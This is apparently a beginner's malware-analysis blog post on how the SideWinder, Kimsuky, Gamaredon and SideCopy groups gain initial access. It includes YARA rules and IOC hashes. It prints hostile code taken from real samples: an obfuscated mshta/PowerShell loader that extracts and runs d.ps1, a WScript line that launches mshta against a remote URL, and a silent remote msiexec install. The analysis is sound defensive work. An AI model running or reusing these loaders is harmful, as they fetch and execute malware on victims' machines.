---
layout: post
title: "Looking into Initial Access Payloads by APT Groups"
date: 2025-02-07
categories: ["Non-PE Malware"]
---

## Contents
- Introduction.
- Motivation.
- Technical Analysis
    - Case 1 : Sidewinder using malicious document to drop RTF Payload.
    - Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.
    - Case 3 : Gamaredon using HTA to drop further malware.
    - Case 4 : Sidecopy using lnk to drop malicious msi file
- YARA Rule.
    - Detecting Maldoc.
    - Detecting LNK.
    - Detecting HTA.
- IOCs.
- Limitations.
- MITRE ATT&CK.

## Introduction
![image](https://github.com/user-attachments/assets/b975d5f5-9074-4bd4-b747-efbaaa380ffd)

I recently started learning about maldoc analysis as part of my malware analysis journey. During this process, I explored different APT groups, including SideWinder( 🇮🇳 ), Kimsuky ( 🇰🇵 ) , and Gamaredon ( 🇷🇺 ). I analyzed their samples, focusing on how they gain initial access. To conduct my research, I used platforms like VirusTotal, Twitter, and MalwareBazaar to find and study real-world malware samples.So, I am writing this blog which contains my findings for the same.

## Motivation

My motivation is to explore different areas of malware analysis and gain a deeper understanding of how cyber threats operate. By researching various APT groups, I can learn about different initial access techniques used by attackers. This helps in understanding the diverse ways cybercriminals infiltrate systems. The more APT groups I analyze, the better I can recognize attack patterns and improve threat detection skills. My goal is to continuously expand my knowledge in Malware Analysis and Threat Research.

## Technical Analysis

I wanted to learn about different APT groups and how they execute attacks in the initial phase. So, I collected three malware samples of different APT groups from MalwareBazaar and studied their initial attack methods.

Each group uses a different approach:

- SideWinder delivers a malicious document (Maldoc).
- Kimsuky uses a LNK file.
- Gamaredon deploys an HTA file.
- Sidecopy using a LNK file

Now, I will analyze these files to understand their attack techniques.

### Case 1 : Sidewinder using malicious document to drop RTF Payload.

During my analysis of an initial phishing attempt, I came across a document file. To examine its internal structure, I used the oleid command, which helped identify that the file contained an external relationship. This indicated that the document might be referencing or attempting to fetch external content.

![image](https://github.com/user-attachments/assets/e758e58b-4572-4da6-9d70-94862601927d)


To dig deeper, I used the `oleobj` command, which revealed that the document was configured to **download an RTF file from an external source**. The URL of this external file was embedded within the document, and the file being fetched was named **profile.rtf**. This suggests that the document was likely being used to execute a second-stage payload, making it a potential **malicious downloader**.

`hxxps://pubad-gov-lk.org-co.net/10472857/Profile.rtf`

Then, after doing some research, I found that this is a **decoy RTF file**, while the actual **RTF payload** had already been removed from the **C2 server**.

For anyone interested in researching further on **how SideWinder targets victims or delivers the actual RTF payload**, you can refer to this [research](https://blog.strikeready.com/blog/rattling-the-cage-of-a-sidewinder/).

### Case 2 : Kimsuky using malicious LNK file to drop PowerShell payload.

In this case, I analyzed an **LNK file** and began by examining its **file structure**. During the analysis, I identified the following **flags**, which I will detail below.

LNK File Structure Analysis :

- **Flags Breakdown**:
    - `HasLinkTargetIDList`: Indicates that the LNK file contains a target ID list, pointing to a specific file or directory.
    - `HasLinkInfo`: Provides additional path information about the target file.
    - `HasArguments`: 
    When `HasArguments` is set, it means the LNK file has extra parameters (Command -line arguments) that will be executed when the shortcut is opened.
    - `EnableTargetMetadata`: Allows retrieving metadata for the target file.
      
- Target Execution Path:
  
  ![image_kimsuky](https://github.com/user-attachments/assets/88a27a9c-a177-4722-a1d2-186294f46347)

- **LinkTargetIDList →** `CLSID_MyComputer\C:\Windows\System32\mshta.exe`
- `mshta.exe` is a legitimate Windows utility, but attackers often misuse it to run **obfuscated JavaScript** for executing hidden **PowerShell commands**. This can download and execute malicious files. This technique falls under **LOLBins**, where trusted Windows utilities are exploited to bypass security detection.

Command-Line Arguments: Embedded JavaScript Execution

The **Command-Line Arguments** field in the LNK file contains **JavaScript code**, which will be executed along with **`mshta.exe`**. This means that when the LNK file is opened, `mshta.exe` will **run the JavaScript code**, potentially executing further malicious scripts.

Extracted JavaScript Code :

After extracting the JavaScript embedded in the LNK file, I obtained the following script:

```jsx
javascript:v=" -Encoding Byte;sc ";
s="a=new Ac"+"tiveXObject('WSc"+"ript.Shell');a.Run(c,0,true);close();";
c="powe"+"rshell -ep bypass -c $t=0x1be8;$k = Get-ChildItem .lnk | where-object {$*.length -eq $t} | Select-Object -ExpandProperty Name;
if($k.count -eq 0){$k=Get-ChildItem $env:T"+"EMP\\\\*.lnk | where-object{$*.length -eq $t};};
$w='c:\\programdata\\d.ps1';
$f=gc $k"+v+"$w ([byte[]]($f | sel"+"ect -Skip 0x094a)) -Force"+v+"c:\\programdata\\b21111 0;
po"+"wersh"+"ell -ep bypass -f $w;";
eval(s);
```
This JavaScript code is trying to run a hidden **PowerShell command** using `mshta.exe`. It does this in several steps:

- The script creates a **WScript.Shell** object, which helps run commands on Windows.
- It then prepares a PowerShell command and executes it.
- The script looks for a **.lnk (shortcut) file** in the current folder.
- If it doesn't find the file, it searches in the **TEMP folder**.
- It checks if the file has a **specific size (7144 bytes)** to make sure it's the correct one.
- The script **reads the contents** of the .lnk file.
- It **skips the first part** of the file (2378 bytes) and extracts **some hidden data**.
- This data is saved as a new **PowerShell script** (`d.ps1`).
- The script **runs `d.ps1` using PowerShell**, which could be another piece of malware.
- It also calls another unknown program (`b21111`), which might be part of the attack.

Then, after researching the d.ps1 file, I found that it is obfuscated, which further on de-obfuscating, I found it has been downloading another ZIP file containing malware known as gs.zip , which contains the final payload.


### Case 3 : Gamaredon using HTA to drop further malware.

In this case, the file I found during the initial phishing analysis is an HTA file, which is a combination of HTML and VBScript.

![image_gam1](https://github.com/user-attachments/assets/76e4c57a-55e8-403b-8dff-c079730184f8)


When I analyzed this HTML file, I found multiple IP addresses and several **Domain Generation Algorithm (DGA)** domains associated with the **trycloudflare[.]com** website, as shown in the image below. **DGAs** are used by attackers to generate a large number of domain names dynamically, making it harder for security solutions to block them.

![image_gam2](https://github.com/user-attachments/assets/745bdd5d-de01-4c96-a969-39a54cf76a45)


Additionally, I discovered a **malicious script** embedded within the HTML file. Instead of being directly visible, the script was stored in a **string format** and was later reconstructed by concatenation. Once decoded, it was found to be executing another script, which could potentially download or execute additional payloads.

Now, let's analyze this script further to understand its purpose and behavior.

```jsx
CreateObject("WScript.Shell")[.]Run  "%windir%\system32\mshta[.]exe " &  "hxxps://louise-gzip-think-air.trycloudflare.com/OD/rotI7D/shortlyqXW.tif”
```

This script basically accesses the **Windows Shell** and runs `mshta.exe`. The likely reason for using `mshta.exe` is to execute the script **without triggering any security warnings**.

Additionally, the script contains a **remote URL** that appears to download a file with a `.tif` extension. However, I suspect that this is actually a **malicious payload** being fetched from a **C2 server** rather than a legitimate image file.

### Case 4 : Sidecopy using lnk to drop malicious msi file

I analyzed an **LNK file** and found that its **TargetIDList** contains the path:

`MyComputer\C:\Windows\System32\cmd.exe` 

This indicates that the LNK file is designed to open the Windows **Command Prompt**.

Upon further examination of the **command-line arguments**, I found the following command:

```jsx
/c msiexec.exe /q /i hxxps://nhp.mowr.gov[.]in/NHPMIS/TrainingMaterial/aspx/Security-Guidelines/wont/
```

Breakdown of the command:

- **`/c`** → Executes the command and then closes the Command Prompt.
- **`msiexec.exe`** → A built-in Windows executable used to run **MSI (Microsoft Installer) files**.
- **`/q` (Quiet Mode)** → Installs the MSI file **silently**, without any user interaction or pop-ups.
- **The provided URL** → Hosts an **MSI file**, which is **fetched remotely** and executed.

![vt](https://github.com/user-attachments/assets/c4c84b94-e502-4677-899e-993e791f0915)

```sha256 : 541039d4eb67935884830657213991ba5da85f0650df6329c7153702a577a26a```

```filename : installerr.msi```


Potential Threat:

- **Attackers often use remote MSI installations** to **deploy malware** without user awareness.
- **Silent execution (`/q` flag)** ensures the installation happens discreetly, making detection more difficult.
- **VirusTotal analysis confirmed that the MSI file is malicious**, indicating a potential **APT attack or malware deployment**.

# YARA Rule
I am learning YARA rules for the first time, so I have written this rule to detect three malicious files. It works by searching for basic strings within the file.

### Detecting Maldoc.
    
    rule sidewinder
    {
        meta:
            aurhor = "Priya"
            description = "This rule detects malicious sidewinder payload"
    
        strings:
            $url_name = "https://pubad-gov-lk.org-co.net/10472857/"
            $rtf_name = "Profile.rtf"
    
        condition:
            $url_name or $rtf_name
    }
    
### Detecting LNK Kimsuky

    rule detect_lnk
    {

    meta:
        author = "Priya"
        description = "This yara rule detects malicious lnk file"

    strings:
        $filename = "d.ps1"
        $filesize = "0x1be8"
        $susnname = "jooyoung"

    condition:
        any 2 of them
    }
    
### Detecting HTA.

    rule hta_file 
    {
    meta:
        author = "Priya"
        Description = "This rule is to check for malicious hta file"

    strings:
        $url_name = "trycloudflare"
        $payload = "shortlyqXW.tif"
        $ip_add = "102.237.232.209"
        $login = "https://passport.i.ua/login/?"

    condition:
        
        $url_name and $payload or $ip_add or $login
    }

### Detecting LNK for Sidecopy

    rule detect_sidecopy
    {
        meta:
            author = "Priya"
            Description = "This rule is to detect malicious lnk file of Sidecopy "
    
        strings:
            $cmd_args =                                                 /\/c\s*m\^s\^i\^e\^x\^e\^c\.exe\s*\/q\s*\/i\s*h\^t\^t\^p\^s\^:\^\/\^\/\^n\^h\^p\^\.\^m\^o\^w\^r\^\.\^g\^o\^v\^\.\^i\^n\^\/\^N\^H\^P\^M\^I\^S\^\/\^T\^r\^a\^i\^n\^i\^n\^g\^M\^a\^t\^e\^r\^i\^a\^l\^\/\^a\^s\^p\^x\^\/\^S\^e\^c\^u\^r\^i\^t\^y\^\-\^G\^u\^i\^d\^e\^l\^i\^n\^e\^s\^\/\^w\^o\^n\^t\^\//i
    
        condition:
            $cmd_args
            
    }

### IOCs.

```268640934dd1f0cfe3a3653221858851a33cbf49a71adfb4d54a04641df11547```

```47d77499968244911d0179fb858578de00dbb98079e33f5ed5d229d03eb04d67```

```95f5db1826819d8d61b85eec206ec6cba350ba3fd684941ae24fe363de1df2cb```

```cc90bf946b495aec9133f6c970dc873977592277d003248361cfea1d0706c811```


### Limitations

Thank you everyone for reading my small blog, as you know I have just started to write research as I finally complete my graduation. So, there might be places, where I may be wrong, please do let me know if you find anything wrong, thank you for reading, stay tuned for more blogs on malware analysis 

### References

https://x.com/bofheaded/status/1888546141886976322

https://x.com/malwrhunterteam/status/1890038780683534771

https://x.com/suyog41/status/1891372873496834115
  

